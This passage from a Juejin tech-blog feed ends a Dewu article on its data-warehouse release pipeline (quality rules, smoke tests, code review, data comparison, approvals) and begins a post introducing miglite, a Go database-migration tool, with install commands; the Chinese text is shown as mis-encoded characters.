<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5962e1b7c45242d9bf90bfc4b3c2e965~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770274403&amp;x-signature=XldHabsNTfOMJ6sPXO6znTkJFfw%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>DQCå¼ºè§„åˆ™å’Œå¼±è§„åˆ™çš„é…ç½®æ–¹å¼å®Œå…¨ä¸€è‡´ï¼Œé€šè¿‡Tabçš„åˆ‡æ¢ï¼Œå¯ä»¥å®Œæˆå¼ºå¼±è§„åˆ™çš„é…ç½®ã€‚</p>
<p><strong>è´¨é‡DQCè¯•è¿è¡Œ</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/63209616aa5c4f23a6585636ea201e16~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770274403&amp;x-signature=VwH6bLAI7qETWL86u9mqJsg1hZY%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>æ‰€æœ‰DQCé…ç½®å®Œæˆåï¼Œéœ€è¦é€šè¿‡è¯•è¿è¡Œä¹‹åæ‰èƒ½ä¿å­˜ä¸Šçº¿ï¼Œç¡®ä¿DQCé…ç½®çš„åˆç†æ€§ã€æœ‰æ•ˆæ€§ã€‚</p>
<p><strong>å‘Šè­¦ç­–ç•¥</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/924be0c0232847fb985fff63432c9d40~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770274403&amp;x-signature=u064XJgH0xNHpZMB15dZK2lysiA%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>æ”¯æŒé£ä¹¦ã€ç”µè¯ã€çŸ­ä¿¡ã€é‚®ç®±ç­‰æ–¹å¼å‘Šè­¦é€šçŸ¥ã€‚å…¶ä¸­å¼ºè§„åˆ™ä¸€æ—¦è§¦å‘ï¼Œå¿…å®šç”µè¯å‘Šè­¦ï¼ˆé‡‡å–15åˆ†é’Ÿæ— å“åº”å³é€çº§ä¸Šå‡åŸåˆ™ï¼‰ã€‚</p>
<p><strong>å‘å¸ƒæµæ°´çº¿ç®¡æ§</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce8d58bbb15b4e5aa6bd4d3963452cc2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770274403&amp;x-signature=qcRcaLfzKFjoU3s1IRryc12MpeE%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b9feb9ce26724d57aa8ca88768e0a6a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770274403&amp;x-signature=IK4SX69%2FGUyIHEnNW%2B5Q%2FTRsntk%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><strong>é™æ€æ‰«æ</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/32ad381e710944d2b45b515c01af2f0d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770274403&amp;x-signature=zOpY7suZOCLsCUZgMzDyZZcX0TM%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b192059f63b44e3a4bfc774e33a628b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770274403&amp;x-signature=%2B8iTU3GXC8epX8Vlh%2FPuIKmonmY%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>æ£€æµ‹è§„åˆ™ï¼šä»»åŠ¡ä¾èµ–ã€å»ºè¡¨è§„èŒƒã€ç¼–ç è§„èŒƒã€é›†æˆè§„èŒƒã€DQCè§„èŒƒç­‰ã€‚</p>
<p><strong>å†’çƒŸæµ‹è¯•</strong></p>
<p>åœ¨æ•°ä»“æµ‹è¯•ç¯å¢ƒä¸‹ï¼Œå®Œæˆä»»åŠ¡å†’çƒŸæµ‹è¯•æ‰§è¡Œï¼Œæ‰§è¡Œå†…å®¹åŒ…å«ï¼šETLä»»åŠ¡ã€DQCè§„åˆ™ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6eeb933954cb4c3e83e8255b003d02ff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770274403&amp;x-signature=8lcZK1qNQ1RISk1MXWUupsqFHPs%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><strong>CodeReview</strong></p>
<p>æè¿°ï¼šæ ¹æ®ä¸šåŠ¡ç†Ÿæ‚‰å¯¹ï¼Œç”±æ•°æ®åŸŸæ•°ä»“PM æˆ–è€… ä¸šåŠ¡æ•°ä»“æŠ€æœ¯è´Ÿè´£äººè¿›è¡Œè¯„å®¡ï¼Œç»™å‡ºè¯„å®¡ç»“è®ºã€‚</p>
<p>å†…å®¹ï¼šETLä»£ç ã€è°ƒåº¦é…ç½®ã€è´¨é‡å®šä¹‰é…ç½®ã€DQC-SQLç­‰ã€‚</p>
<p>æ³¨æ„ï¼šå®¡æ‰¹äººé£ä¹¦ä¼šæ¥æ”¶åˆ°æ¥è‡ªâ€œxxç¨³å®šä¸­å¿ƒâ€æœºå™¨äººæ¨é€çš„æ¶ˆæ¯ï¼Œç‚¹å‡»è¿›å…¥å®¡æ‰¹è¯¦æƒ…å®Œæˆå®¡æ‰¹å³å¯ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b1ecd73992434cb79c77b75eab7164c4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770274403&amp;x-signature=7uX7O1vN6ZbbD7DDZttpIzF%2BAL4%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><strong>æ•°æ®æ¢æŸ¥</strong></p>
<p>æè¿°ï¼šé’ˆå¯¹è¡¨å†…æ‰€æœ‰å­—æ®µè¿›è¡Œæ¢æŸ¥å’Œæ ¡éªŒï¼Œä¸»è¦åœºæ™¯ï¼šæ•°å­—æ¢æŸ¥ã€å­—ç¬¦æ¢æŸ¥ã€ä¸»é”®éªŒè¯ã€æ— æ•ˆå­—æ®µéªŒè¯ã€å¼‚å¸¸å­—æ®µéªŒè¯</p>
<p>PSï¼šæ•°å­—æ¢æŸ¥å’Œå­—ç¬¦æ¢æŸ¥ä¼šç»™å‡ºæ˜æ˜¾é—®é¢˜çº¢è‰²é«˜äº®æ ‡è¯†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd1305690b6d44dbb26c20f6057358f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770274403&amp;x-signature=FrYlzF6QEGxUgVHxHaNfyPvgjGg%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79697b5c131b432bac3440ceb2ec194e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770274403&amp;x-signature=8o6JPjaV8O9lg%2F0iPBIC5e1Oep0%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><strong>æ•°æ®æ¯”å¯¹</strong></p>
<p>æè¿°ï¼šé’ˆå¯¹ç”Ÿäº§è¡¨å’Œæµ‹è¯•è¡¨è¿›è¡Œæ•°æ®æ¯”å¯¹ï¼Œæ¯”å¯¹åœºæ™¯ï¼šæ•°æ®é‡å¯¹æ¯”ã€èšåˆæŒ‡æ ‡å¯¹æ¯”ã€æ˜ç»†å¯¹æ¯”ã€‚</p>
<p>æ³¨æ„ä¿¡æ¯ï¼šå¯¹æ¯”çš„ä¸¤å¼ è¡¨ç”¨æˆ·æ— æ³•è¾“å…¥ï¼Œç”¨æˆ·éœ€è¦è¾“å…¥æ‰§è¡Œåˆ†åŒºã€ä¸»é”®å­—æ®µã€å»å™ªå­—æ®µã€é£é™©é˜ˆå€¼ï¼ˆé’ˆå¯¹æ˜ç»†å¯¹æ¯”ç”Ÿæ•ˆï¼‰ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1fda58c471ee46108b5e520e644ecf4e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770274403&amp;x-signature=AwYFo9VTNy6Gw3%2BPoC%2F%2FxwV4Hy0%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><strong>å‘å¸ƒå®¡æ‰¹</strong></p>
<p>æè¿°ï¼šå‘å¸ƒå®¡æ‰¹èŠ‚ç‚¹ï¼Œç”¨æˆ·è¾“å…¥æœ¬æ¬¡å‘å¸ƒçš„åŸºç¡€ä¿¡æ¯ï¼Œæäº¤å®¡æ‰¹å³å¯ã€‚</p>
<p>æ‰€æœ‰éœ€æ±‚éƒ½éœ€è¦æ•°æ®åŸŸPMå’Œå¯¹åº”æ•°æ®åŸŸçš„è´£ä»»QAè¿›è¡Œå®¡æ‰¹ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ee84a4e7a23743dcbf98092ab8e909e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770274403&amp;x-signature=iyZwVJ%2Fl3uvhqnWpTmGfNxQpEQw%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<h2 data-id="heading-5">å››ã€æ€»ç»“&amp;æœªæ¥è§„åˆ’</h2>
<h3 data-id="heading-6">å®è·µæ€»ç»“</h3>
<p>å¾—ç‰©ç¦»çº¿æ•°ä»“å‘å¸ƒæµæ°´çº¿è¿‡å»1å¹´æœ‰ç€ä»0åˆ°1çš„å»ºè®¾ï¼Œä»¥åŠåæœŸä»1åˆ°10çš„ä¼˜åŒ–å’Œæ”¹è¿›ã€‚å½“å‰æµæ°´çº¿èƒ½åŠ›å·²ç»è¶³ä»¥æ”¯æ’‘æ•°ä»“å†…éƒ¨æ—¥å¸¸è¿­ä»£å˜æ›´éœ€æ±‚çš„å‘å¸ƒç®¡æ§ï¼Œä¸ºå‘å¸ƒå‡†å‡ºè§„åˆ™æ‰§è¡Œæä¾›äº†å·¨å¤§å¸®åŠ©ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c5761a470744a7e8d0d9fe86f1c8815~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770274403&amp;x-signature=mDN6ddVP0IZQze8m%2F1EMU3jFu%2Bg%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>å‘å¸ƒç®¡æ§å¯¹äºQAæ¥è¯´æ˜¯æœ€é‡è¦çš„ä¸€ä¸ªç¯èŠ‚ï¼Œæ‰€æœ‰å‘å¸ƒéƒ½èƒ½å¤Ÿè¾¾åˆ°å‡†å‡ºæ ‡å‡†çš„è¦æ±‚ï¼Œä»è€Œæ‰èƒ½å®ˆä½å‘å¸ƒçš„æœ€åä¸€é“çº¿ã€‚</p>
<h3 data-id="heading-7">æœªæ¥è§„åˆ’</h3>
<p><strong>èŠ‚ç‚¹èƒ½åŠ›ä¼˜åŒ–</strong></p>
<p>å½“å‰æ•°ä»“è¡¨å•åˆ†åŒºå¤§äº3TBï¼ˆåäº¿ã€ç™¾äº¿ã€åƒäº¿çº§åˆ«ï¼‰å­˜å‚¨æ•°æ®åï¼Œæ•°æ®æ¢æŸ¥ã€æ•°æ®æ¯”å¯¹å°†ä¸æä¾›éªŒè¯æœåŠ¡ï¼Œä¸»è¦æºäºæ•°æ®é‡ã€å­˜å‚¨è¿‡å¤§ã€å­—æ®µè¿‡å¤šï¼Œå¯¹è®¡ç®—èµ„æºã€è®¡ç®—å­˜å‚¨å¸¦æ¥å·¨å¤§çš„æ¶ˆè€—ï¼Œä¸¥é‡å½±å“å…¶ä»–ä»»åŠ¡çš„æ‰§è¡Œè¿›åº¦ã€‚åç»­é€šè¿‡æ•°æ®æŠ½æ ·éªŒè¯çš„æ–¹å¼ä»è€Œé™ä½èµ„æºçš„æ¶ˆè€—ï¼Œä»è€Œæå‡åœºæ™¯è¦†ç›–åº¦ã€‚</p>
<p><strong>æµæ°´çº¿èƒ½åŠ›è¡¥å……</strong></p>
<p>æ•°æ®æ¢æŸ¥æœªæ¥è€ƒè™‘é€šè¿‡å’Œå†å²æ¢æŸ¥ç»“æœæ¯”å¯¹å‚è€ƒçš„æ–¹å¼ï¼Œç»™å‡ºè¯Šæ–­ç»“æœï¼Œè¿›ä¸€æ­¥æå‡å·¥å…·å¡ç‚¹èƒ½åŠ›ã€‚</p>
<h3 data-id="heading-8">å¾€æœŸå›é¡¾</h3>
<p>1.AIç¼–ç¨‹å®è·µï¼šä»Claude Codeå®è·µåˆ°å›¢é˜Ÿåä½œçš„ä¼˜åŒ–æ€è€ƒï½œå¾—ç‰©æŠ€æœ¯</p>
<p>2.å…¥é€‰AAAI-PerFMï½œå¾—ç‰©ç¤¾åŒºæ¨èä¹‹åŸºäºå¤§è¯­è¨€æ¨¡å‹çš„æ–°é¢–æ€§æ¨èç®—æ³•Â </p>
<p>3.Galaxyæ¯”æ•°å¹³å°åŠŸèƒ½ä»‹ç»åŠå®ç°åŸç†ï½œå¾—ç‰©æŠ€æœ¯</p>
<p>4.å¾—ç‰©Appæ™ºèƒ½å·¡æ£€æŠ€æœ¯çš„æ¢ç´¢ä¸å®è·µ</p>
<p>5.æ·±åº¦å®è·µï¼šå¾—ç‰©ç®—æ³•åŸŸå…¨æ™¯å¯è§‚æµ‹æ€§ä» 0 åˆ° 1 çš„æ¼”è¿›ä¹‹è·¯</p>
<h3 data-id="heading-9">æ–‡ /å®¶æ£®</h3>
<p>å…³æ³¨å¾—ç‰©æŠ€æœ¯ï¼Œæ¯å‘¨æ›´æ–°æŠ€æœ¯å¹²è´§</p>
<p>è¦æ˜¯è§‰å¾—æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©çš„è¯ï¼Œæ¬¢è¿è¯„è®ºè½¬å‘ç‚¹èµï½</p>
<p>æœªç»å¾—ç‰©æŠ€æœ¯è®¸å¯ä¸¥ç¦è½¬è½½ï¼Œå¦åˆ™ä¾æ³•è¿½ç©¶æ³•å¾‹è´£ä»»ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[miglite: æç®€é«˜æ•ˆçš„æ•°æ®åº“è¿ç§»å·¥å…·]]></title>    <link>https://juejin.cn/post/7600326947506192436</link>    <guid>https://juejin.cn/post/7600326947506192436</guid>    <pubDate>2026-01-29T06:31:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600326947506192436" data-draft-id="7600355625474359348" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="miglite: æç®€é«˜æ•ˆçš„æ•°æ®åº“è¿ç§»å·¥å…·"/> <meta itemprop="keywords" content="Go,GitHub"/> <meta itemprop="datePublished" content="2026-01-29T06:31:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="inhere"/> <meta itemprop="url" content="https://juejin.cn/user/1099167359829453"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            miglite: æç®€é«˜æ•ˆçš„æ•°æ®åº“è¿ç§»å·¥å…·
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1099167359829453/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    inhere
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T06:31:49.000Z" title="Thu Jan 29 2026 06:31:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ğŸš€ miglite: æç®€é«˜æ•ˆçš„æ•°æ®åº“è¿ç§»å·¥å…·ï¼</p>
<blockquote>
<p>å¦‚æœä½ åŒå€¦äº†å¤æ‚åºå¤§çš„æ•°æ®åº“è¿ç§»å·¥å…·ï¼Œæ¸´æœ›ä¸€ä¸ªè½»é‡çº§ã€é›¶é…ç½®ä¸”åŠŸèƒ½å¼ºå¤§çš„è§£å†³æ–¹æ¡ˆï¼Œé‚£ä¹ˆ miglite ç»å¯¹å€¼å¾—ä¸€è¯•ã€‚å®ƒç”¨æœ€çº¯ç²¹çš„æ–¹å¼è§£å†³æ•°æ®åº“ Schema è¿ç§»é—®é¢˜ï¼Œè®©å¼€å‘è€…å›å½’ç¼–ç æœ¬èº«ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">âœ¨ é¡¹ç›®ç®€ä»‹</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgookit%2Fmiglite" target="_blank" title="https://github.com/gookit/miglite" ref="nofollow noopener noreferrer">miglite</a> æ˜¯ä¸€ä¸ªç”¨ Golang å®ç°çš„<strong>æç®€æ•°æ®åº“ Schema è¿ç§»å·¥å…·</strong>ï¼Œå®ƒç§‰æŒ"åšä¸€ä»¶äº‹å¹¶åšå¥½"çš„è®¾è®¡å“²å­¦ï¼Œæä¾›äº†æ ¸å¿ƒè¿ç§»åŠŸèƒ½çš„åŒæ—¶ï¼Œä¿æŒäº†æè‡´çš„è½»é‡å’Œæ˜“ç”¨æ€§ã€‚</p>
<h3 data-id="heading-1">ğŸ¯ æ ¸å¿ƒç‰¹æ€§</h3>



































<table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">æè¿°</th><th align="left">ä¼˜åŠ¿</th></tr></thead><tbody><tr><td align="left"><strong>ğŸª¶ æç®€ä¾èµ–</strong></td><td align="left">åŸºäº <code>database/sql</code> æ¥å£å¼€å‘ï¼Œé»˜è®¤<strong>ä¸æ·»åŠ </strong>ä»»ä½•é©±åŠ¨ä¾èµ–åŒ…</td><td align="left">ä¿æŒé¡¹ç›®è½»é‡ï¼Œé¿å…ä¾èµ–å†²çª</td></tr><tr><td align="left"><strong>ğŸ“ åŸç”Ÿ SQL</strong></td><td align="left">ä½¿ç”¨åŸå§‹ SQL æ–‡ä»¶ä½œä¸ºè¿ç§»æ–¹å¼ï¼Œæ— ç‰¹å®š DSL å­¦ä¹ æˆæœ¬</td><td align="left">ç›´æ¥åˆ©ç”¨ç°æœ‰ SQL æŠ€èƒ½ï¼Œè¿ç§»é€»è¾‘é€æ˜å¯æ§</td></tr><tr><td align="left"><strong>ğŸ”’ äº‹åŠ¡ä¿éšœ</strong></td><td align="left">æ‰€æœ‰è¿ç§»æ“ä½œå‡åœ¨äº‹åŠ¡ä¸­æ‰§è¡Œï¼Œç¡®ä¿æ•°æ®ä¸€è‡´æ€§</td><td align="left">å‡ºç°é—®é¢˜å¯è‡ªåŠ¨å›æ»šï¼Œé¿å…æ•°æ®åº“å¤„äºä¸ä¸€è‡´çŠ¶æ€</td></tr><tr><td align="left"><strong>ğŸ”§ é›¶é…ç½®æ”¯æŒ</strong></td><td align="left">æ”¯æŒé€šè¿‡ç¯å¢ƒå˜é‡ç›´æ¥è¿è¡Œï¼Œè‡ªåŠ¨åŠ è½½ <code>.env</code> å’Œé»˜è®¤é…ç½®æ–‡ä»¶</td><td align="left">å¿«é€Ÿå¯åŠ¨ï¼Œå‡å°‘é…ç½®çƒ¦æ¼</td></tr><tr><td align="left"><strong>ğŸ—„ï¸ å¤šæ•°æ®åº“æ”¯æŒ</strong></td><td align="left">æ”¯æŒ MySQLã€SQLiteã€PostgreSQL ç­‰ä¸»æµæ•°æ®åº“</td><td align="left">ä¸€å¥—å·¥å…·ï¼Œå¤šä¸ªé¡¹ç›®å¤ç”¨</td></tr></tbody></table>
<h2 data-id="heading-2">ğŸ› ï¸ å¿«é€Ÿå¼€å§‹</h2>
<h3 data-id="heading-3">å®‰è£…æ–¹å¼</h3>
<h4 data-id="heading-4">ä½œä¸ºå‘½ä»¤è¡Œå·¥å…·ä½¿ç”¨</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># é€šè¿‡ go å®‰è£…</span>
go install github.com/gookit/miglite/cmd/miglite@latest
</code></pre>
<h4 data-id="heading-5">ä½œä¸º Go åº“é›†æˆ</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ·»åŠ ä¾èµ–</span>
go get github.com/gookit/miglite

<span class="hljs-comment"># å¯¼å…¥ä½¿ç”¨</span>
import <span class="hljs-string">"github.com/gookit/miglite"</span>
</code></pre>
<h3 data-id="heading-6">åŸºæœ¬ä½¿ç”¨æµç¨‹</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    A[å®‰è£… miglite] --&gt; B[é…ç½®æ•°æ®åº“è¿æ¥]
    B --&gt; C[åˆ›å»ºè¿ç§»æ–‡ä»¶]
    C --&gt; D[ç¼–å†™ UP/DOWN SQL]
    D --&gt; E[æ‰§è¡Œè¿ç§»]
    E --&gt; F[æŸ¥çœ‹çŠ¶æ€]
    
    style A fill:#e3f2fd,stroke:#2196f3,color:#0d47a1
